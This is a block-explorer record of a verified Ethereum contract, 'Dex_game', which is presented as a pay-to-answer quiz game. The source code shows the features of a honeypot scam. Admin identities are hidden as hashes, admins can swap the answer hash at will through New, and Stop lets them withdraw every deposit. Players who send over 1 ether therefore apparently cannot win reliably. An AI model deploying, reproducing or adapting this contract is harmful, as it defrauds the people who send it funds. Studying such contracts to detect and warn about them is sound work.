{
  "TxHash": "0x841fd733877d5568daee2d302a8d79bb442f21c67dc883e23ff80c4e9ef3393d",
  "ContractAddress": "0x5b2041EE4b5a66e85986679932398580bE3103DE",
  "Name": "Dex_game",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "contract Dex_game\r\n{\r\n    function Try(string memory _response) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(abi.encode(_response)) \u0026\u0026 msg.value \u003e 1 ether)\r\n        {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=\u003ebool) admin;\r\n\r\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(abi.encode(_response));\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n        responseHash = 0x0;\r\n    }\r\n\r\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] memory admins) {\r\n        for(uint256 i=0; i\u003c admins.length; i++){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(abi.encodePacked(msg.sender))]);\r\n        _;\r\n    }\r\n\r\n    fallback() external {}\r\n}",
      "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"bytes32\",\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
      "ContractName": "Dex_game",
      "CompilerVersion": "v0.8.19+commit.7dd6d404",
      "OptimizationUsed": "1",
      "Runs": "200",
      "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003073791f9ad4d52ad30ff4ceca74f66cbaa584658564c6fc9e3474afab769c2ad7ecc37bcbae22df7712ed5be99917925db58a8425d2e69d1fd6b8968afb42fb79538853edeb62eab46aad42db7197e7db20ae6d942591d8fd5bc206c4eb25996",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "GNU GPLv3",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://4c3d75d9ed90ebf824300632900045703f27635e02046aa5fc69d744ee732bbf"
    }
  ]
}
